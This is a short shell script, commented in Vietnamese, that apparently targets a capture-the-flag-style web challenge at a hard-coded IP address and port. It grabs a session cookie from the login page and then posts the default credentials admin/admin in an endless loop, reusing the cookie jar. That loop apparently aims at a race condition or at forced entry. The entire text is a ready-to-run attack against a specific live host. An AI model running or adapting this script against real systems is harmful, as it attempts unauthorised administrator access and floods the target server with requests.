# lấy cookie khi login
curl -i -c jar.txt http://52.59.124.14:5010/login

BASE="http://52.59.124.14:5010"
while true; do
  curl -s -b jar.txt -c jar.txt -d "username=admin&password=admin&submit=" "$BASE/" > /dev/null
done